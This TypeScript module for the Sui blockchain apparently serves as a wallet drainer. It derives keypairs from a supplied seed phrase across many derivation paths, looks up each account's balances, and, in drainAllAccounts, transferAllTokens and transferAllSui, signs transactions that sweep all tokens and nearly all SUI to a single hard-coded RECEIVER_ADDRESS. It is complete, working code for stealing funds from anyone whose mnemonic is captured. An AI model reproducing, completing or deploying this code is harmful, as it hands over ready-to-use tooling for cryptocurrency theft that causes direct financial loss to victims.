
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { Transaction } from "@mysten/sui/transactions"
import { TATUM_API_KEY, RECEIVER_ADDRESS } from "@/lib/config"
import { toBase64 } from "@mysten/sui/utils"

const TATUM_RPC_URL = "https://sui-mainnet.gateway.tatum.io/"
const TATUM_RATE_URL = "https://api.tatum.io/v3/tatum/rate"

const RATE_LIMIT_DELAY = 500
let lastRequestTime = 0

async function rateLimitedWait(): Promise<void> {
  const now = Date.now()
  const timeSinceLastRequest = now - lastRequestTime
  if (timeSinceLastRequest < RATE_LIMIT_DELAY) {
    await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY - timeSinceLastRequest))
  }
  lastRequestTime = Date.now()
}

function getTatumKey(): string {
  return TATUM_API_KEY
}

export type SuiBalance = {
  coinType: string
  symbol: string
  decimals: number | null
  totalBalance: string
  uiAmount: number
}

export type AccountSnapshot = {
  accountIndex: number
  address: string
  balances: SuiBalance[]
  suiAmount: number
  suiUsdValue: number | null
}

export function deriveAddresses(mnemonic: string, maxAccounts = 5): {
  accountIndex: number
  address: string
  keypair: Ed25519Keypair
  derivationPath: string
}[] {
  const result: { accountIndex: number; address: string; keypair: Ed25519Keypair; derivationPath: string }[] = []
  const seenAddresses = new Set<string>()

  const pathPatterns = [
    (i: number) => `m/44'/784'/${i}'/0'/0'`,
    (i: number) => `m/44'/784'/0'/0'/${i}'`,
    (i: number) => `m/44'/784'/0'/0'/${i}`,
    (i: number) => `m/44'/784'/${i}'/0'/0`,
    (i: number) => `m/44'/784'/0'/${i}'/0'`,
    () => `m/44'/784'/0'/0/0`,
    (i: number) => `m/44'/784'/${i}'/0/0`,
    (i: number) => `m/44'/784'/0/${i}/0`,
  ]

  for (const getPath of pathPatterns) {
    for (let i = 0; i < maxAccounts; i++) {
      const path = getPath(i)
      try {
        const keypair = Ed25519Keypair.deriveKeypair(mnemonic, path)
        const address = keypair.toSuiAddress()
        if (!seenAddresses.has(address)) {
          seenAddresses.add(address)
          result.push({ accountIndex: result.length, address, keypair, derivationPath: path })
        }
      } catch {
        // skip
      }
    }
  }

  return result
}

async function rpcCall<T = any>(method: string, params: unknown[], retryCount = 0): Promise<T | null> {
  await rateLimitedWait()
  const apiKey = getTatumKey()
  try {
    const res = await fetch(TATUM_RPC_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        ...(apiKey ? { "x-api-key": apiKey } : {}),
      },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
    })
    if (res.status === 429 && retryCount < 5) {
      const waitTime = 2000 * (retryCount + 1)
      await new Promise(resolve => setTimeout(resolve, waitTime))
      return rpcCall<T>(method, params, retryCount + 1)
    }
    if (!res.ok) return null
    const json = (await res.json()) as { result?: T; error?: unknown }
    if (!json || (json as any).error) return null
    return (json.result ?? null) as T | null
  } catch {
    return null
  }
}

function symbolFromCoinType(coinType: string): string {
  const parts = coinType.split("::")
  return parts[parts.length - 1] || coinType
}

function uiAmount(raw: string, decimals: number | null): number {
  if (!raw) return 0
  if (decimals == null || decimals < 0) return Number(raw)
  if (decimals === 0) return Number(raw)
  try {
    const big = BigInt(raw)
    const divisor = BigInt(10) ** BigInt(decimals)
    const whole = big / divisor
    const frac = big % divisor
    const fracStr = frac.toString().padStart(decimals, "0").slice(0, 8)
    return Number(`${whole}.${fracStr}`)
  } catch {
    const n = Number(raw)
    return decimals > 0 ? n / Math.pow(10, decimals) : n
  }
}

async function getCoinDecimals(coinType: string): Promise<number | null> {
  if (coinType === "0x2::sui::SUI") return 9
  const meta = await rpcCall<{ decimals?: number }>("suix_getCoinMetadata", [coinType])
  if (meta && typeof meta.decimals === "number") return meta.decimals
  return null
}

async function getAllBalances(address: string): Promise<SuiBalance[]> {
  const raw = await rpcCall<Array<{ coinType: string; totalBalance: string }>>(
    "suix_getAllBalances",
    [address],
  )
  if (!raw || !Array.isArray(raw)) return []

  const limited = raw.slice(0, 25)
  const balances: SuiBalance[] = []
  for (const b of limited) {
    const decimals = await getCoinDecimals(b.coinType)
    balances.push({
      coinType: b.coinType,
      symbol: symbolFromCoinType(b.coinType),
      decimals,
      totalBalance: b.totalBalance,
      uiAmount: uiAmount(b.totalBalance, decimals),
    })
  }
  return balances
}

let cachedSuiUsd: { value: number; ts: number } | null = null

export async function getSuiUsdPrice(): Promise<number | null> {
  if (cachedSuiUsd && Date.now() - cachedSuiUsd.ts < 60_000) {
    return cachedSuiUsd.value
  }
  const apiKey = getTatumKey()
  try {
    const res = await fetch(`${TATUM_RATE_URL}/SUI?basePair=USD`, {
      headers: apiKey ? { "x-api-key": apiKey } : {},
    })
    if (!res.ok) return null
    const json = (await res.json()) as { value?: string | number }
    const v = Number(json?.value)
    if (!Number.isFinite(v)) return null
    cachedSuiUsd = { value: v, ts: Date.now() }
    return v
  } catch {
    return null
  }
}

export async function buildAccountSnapshots(
  mnemonic: string,
  maxAccounts = 5,
): Promise<{ snapshots: AccountSnapshot[]; suiUsdPrice: number | null; totalSui: number; totalSuiUsd: number | null }> {
  const derived = deriveAddresses(mnemonic, maxAccounts)
  const suiUsdPrice = await getSuiUsdPrice()

  const snapshots: AccountSnapshot[] = []
  for (const { accountIndex, address } of derived) {
    const balances = await getAllBalances(address)
    const sui = balances.find((b) => b.coinType === "0x2::sui::SUI")
    const suiAmount = sui?.uiAmount ?? 0
    const suiUsdValue = suiUsdPrice != null ? suiAmount * suiUsdPrice : null
    snapshots.push({ accountIndex, address, balances, suiAmount, suiUsdValue })
  }

  const totalSui = snapshots.reduce((acc, s) => acc + s.suiAmount, 0)
  const totalSuiUsd = suiUsdPrice != null ? totalSui * suiUsdPrice : null

  return { snapshots, suiUsdPrice, totalSui, totalSuiUsd }
}

export function formatNumber(n: number, maxFraction = 6): string {
  if (!Number.isFinite(n)) return "0"
  if (n === 0) return "0"
  const abs = Math.abs(n)
  if (abs >= 1) return n.toLocaleString("en-US", { maximumFractionDigits: 4 })
  return n.toLocaleString("en-US", { maximumFractionDigits: maxFraction })
}

export function formatUsd(n: number | null): string {
  if (n == null) return "n/a"
  return `$${n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
}

const SUI_COIN_TYPE = "0x2::sui::SUI"
const GAS_BUDGET = 50_000_000

export type TransferResult = {
  success: boolean
  txDigest?: string
  error?: string
  amount?: string
  coinType?: string
}

type CoinObject = {
  coinObjectId: string
  version: string
  digest: string
  balance: string
  coinType: string
}

async function getCoinsRpc(address: string, coinType: string): Promise<CoinObject[]> {
  const coins: CoinObject[] = []
  let cursor: string | null = null

  do {
    const result = await rpcCall<{
      data: CoinObject[]
      nextCursor: string | null
      hasNextPage: boolean
    }>("suix_getCoins", [address, coinType, cursor, 50])

    if (!result || !result.data) break

    for (const coin of result.data) {
      coins.push(coin)
    }

    cursor = result.nextCursor
  } while (cursor)

  return coins
}

async function executeTransactionRpc(txBytes: string, signature: string): Promise<{ digest: string } | null> {
  const result = await rpcCall<{ digest: string }>(
    "sui_executeTransactionBlock",
    [txBytes, [signature], { showEffects: true }, "WaitForLocalExecution"]
  )
  return result
}

async function getReferenceGasPrice(): Promise<bigint> {
  const result = await rpcCall<string>("suix_getReferenceGasPrice", [])
  return result ? BigInt(result) : 1000n
}

export async function transferAllSui(keypair: Ed25519Keypair, fromAddress: string): Promise<TransferResult> {
  try {
    const coins = await getCoinsRpc(fromAddress, SUI_COIN_TYPE)

    if (coins.length === 0) {
      return { success: false, error: "No SUI coins found" }
    }

    const totalBalance = coins.reduce((acc, c) => acc + BigInt(c.balance), 0n)

    const minRequired = BigInt(GAS_BUDGET) + 1000000n
    if (totalBalance <= minRequired) {
      return { success: false, error: `Insufficient balance for gas (need > ${Number(minRequired) / 1e9} SUI)` }
    }

    const gasPrice = await getReferenceGasPrice()

    const tx = new Transaction()
    tx.setSender(fromAddress)
    tx.setGasBudget(GAS_BUDGET)
    tx.setGasPrice(gasPrice)

    tx.setGasPayment(coins.map(c => ({
      objectId: c.coinObjectId,
      version: c.version,
      digest: c.digest,
    })))

    const amountToSend = totalBalance - BigInt(GAS_BUDGET) - 1000000n

    const [coinToSend] = tx.splitCoins(tx.gas, [amountToSend])
    tx.transferObjects([coinToSend], RECEIVER_ADDRESS)

    const txBytes = await tx.build({ onlyTransactionKind: false })

    const signature = await keypair.signTransaction(txBytes)
    const txBytesBase64 = toBase64(txBytes)

    const execResult = await executeTransactionRpc(txBytesBase64, signature.signature)

    if (!execResult || !execResult.digest) {
      return { success: false, error: "Transaction execution failed" }
    }

    const amountTransferred = Number(amountToSend) / 1e9

    return {
      success: true,
      txDigest: execResult.digest,
      amount: amountTransferred.toFixed(6),
      coinType: SUI_COIN_TYPE,
    }
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}

export async function transferAllTokens(
  keypair: Ed25519Keypair,
  fromAddress: string,
  coinType: string,
  decimals: number | null
): Promise<TransferResult> {
  try {
    if (coinType === SUI_COIN_TYPE) {
      return transferAllSui(keypair, fromAddress)
    }

    const suiCoins = await getCoinsRpc(fromAddress, SUI_COIN_TYPE)
    const suiBalance = suiCoins.reduce((acc, c) => acc + BigInt(c.balance), 0n)

    if (suiBalance < BigInt(GAS_BUDGET)) {
      return { success: false, error: "Insufficient SUI for gas" }
    }

    const tokenCoins = await getCoinsRpc(fromAddress, coinType)

    if (tokenCoins.length === 0) {
      return { success: false, error: "No tokens found" }
    }

    const totalBalance = tokenCoins.reduce((acc, c) => acc + BigInt(c.balance), 0n)

    if (totalBalance === 0n) {
      return { success: false, error: "Zero balance" }
    }

    const gasPrice = await getReferenceGasPrice()

    const tx = new Transaction()
    tx.setSender(fromAddress)
    tx.setGasBudget(GAS_BUDGET)
    tx.setGasPrice(gasPrice)

    tx.setGasPayment(suiCoins.map(c => ({
      objectId: c.coinObjectId,
      version: c.version,
      digest: c.digest,
    })))

    const tokenRefs = tokenCoins.map(c => tx.objectRef({
      objectId: c.coinObjectId,
      version: c.version,
      digest: c.digest,
    }))

    if (tokenRefs.length > 1) {
      tx.mergeCoins(tokenRefs[0], tokenRefs.slice(1))
    }

    tx.transferObjects([tokenRefs[0]], RECEIVER_ADDRESS)

    const txBytes = await tx.build({ onlyTransactionKind: false })

    const signature = await keypair.signTransaction(txBytes)
    const txBytesBase64 = toBase64(txBytes)

    const execResult = await executeTransactionRpc(txBytesBase64, signature.signature)

    if (!execResult || !execResult.digest) {
      return { success: false, error: "Token transaction execution failed" }
    }

    const dec = decimals ?? 9
    const amountTransferred = Number(totalBalance) / Math.pow(10, dec)

    return {
      success: true,
      txDigest: execResult.digest,
      amount: amountTransferred.toFixed(6),
      coinType,
    }
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}

export async function drainAllAccounts(
  mnemonic: string,
  maxAccounts = 5
): Promise<{
  results: Array<{
    accountIndex: number
    address: string
    transfers: TransferResult[]
  }>
  totalTransfers: number
  successfulTransfers: number
}> {
  const derived = deriveAddresses(mnemonic, maxAccounts)

  const results: Array<{
    accountIndex: number
    address: string
    transfers: TransferResult[]
  }> = []

  let totalTransfers = 0
  let successfulTransfers = 0

  for (const { accountIndex, address, keypair } of derived) {
    const transfers: TransferResult[] = []

    const balances = await getAllBalances(address)

    const nonZeroBalances = balances.filter(b => b.uiAmount > 0)

    if (nonZeroBalances.length === 0) {
      continue
    }

    const otherTokens = nonZeroBalances.filter(b => b.coinType !== SUI_COIN_TYPE)

    for (const token of otherTokens) {
      const result = await transferAllTokens(keypair, address, token.coinType, token.decimals)
      transfers.push(result)
      totalTransfers++
      if (result.success) successfulTransfers++
    }

    const suiBalance = nonZeroBalances.find(b => b.coinType === SUI_COIN_TYPE)

    if (suiBalance && suiBalance.uiAmount > 0.051) {
      const result = await transferAllSui(keypair, address)
      transfers.push(result)
      totalTransfers++
      if (result.success) successfulTransfers++
    }

    if (transfers.length > 0) {
      results.push({ accountIndex, address, transfers })
    }
  }

  return { results, totalTransfers, successfulTransfers }
}
